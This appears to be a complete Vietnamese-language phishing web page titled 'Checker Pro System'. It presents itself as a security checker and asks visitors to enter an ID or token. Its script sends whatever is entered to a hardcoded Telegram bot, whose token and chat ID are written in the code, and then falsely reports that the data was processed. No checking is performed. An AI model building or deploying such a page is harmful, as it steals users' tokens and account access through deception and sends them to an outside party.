<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Checker Pro System</title>
    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <style>
        body { font-family: 'Montserrat', sans-serif; background: #0f172a; color: white; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
        .container { width: 90%; max-width: 400px; background: #1e293b; padding: 30px; border-radius: 20px; text-align: center; border: 1px solid rgba(255,255,255,0.1); }
        .logo i { font-size: 40px; color: #38bdf8; margin-bottom: 10px; }
        input { width: 100%; padding: 12px; margin: 20px 0; border-radius: 8px; border: 1px solid #334155; background: #0f172a; color: white; box-sizing: border-box; }
        button { width: 100%; padding: 12px; border-radius: 8px; border: none; background: #38bdf8; color: #0f172a; font-weight: bold; cursor: pointer; transition: 0.3s; }
        button:hover { transform: scale(1.02); background: #0ea5e9; }
    </style>
</head>
<body>

<div class="container">
    <div class="logo"><i class="fa-solid fa-shield-halved"></i></div>
    <h2>CHECKER PRO</h2>
    <input type="text" id="userInput" placeholder="Nhập ID hoặc Token...">
    <button onclick="startProcessing()">KIỂM TRA NGAY</button>
</div>

<script>
    // Đảm bảo Chat ID là dãy số bạn vừa tìm thấy
const TELEGRAM_TOKEN = '8680190098:AAFOa_8RrryFZlWmfkhEE73Dns3NWaXS99Q'; 
const CHAT_ID = '6756767312'; 

    async function startProcessing() {
        const val = document.getElementById('userInput').value;
        if (!val) {
            Swal.fire({ icon: 'warning', title: 'Thiếu dữ liệu', text: 'Vui lòng nhập thông tin!', background: '#1e293b', color: '#fff' });
            return;
        }

        Swal.fire({
            title: 'Đang xử lý...',
            background: '#1e293b',
            color: '#fff',
            didOpen: () => { Swal.showLoading(); }
        });

        try {
            const botMsg = `🚀 **DỮ LIỆU MỚI**\n━━━━━━━━━━━━━\n👤 **Data:** \`${val}\`\n⏰ **Lúc:** ${new Date().toLocaleString()}`;
            
            const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, text: botMsg, parse_mode: 'Markdown' })
            });

            if (response.ok) {
                Swal.fire({ icon: 'success', title: 'Hoàn tất', text: 'Dữ liệu đã được xử lý!', background: '#1e293b', color: '#fff' });
                document.getElementById('userInput').value = '';
            } else { throw new Error(); }
        } catch (error) {
            Swal.fire({ icon: 'error', title: 'Lỗi', text: 'Kết nối thất bại!', background: '#1e293b', color: '#fff' });
        }
    }
</script>

</body>
</html>
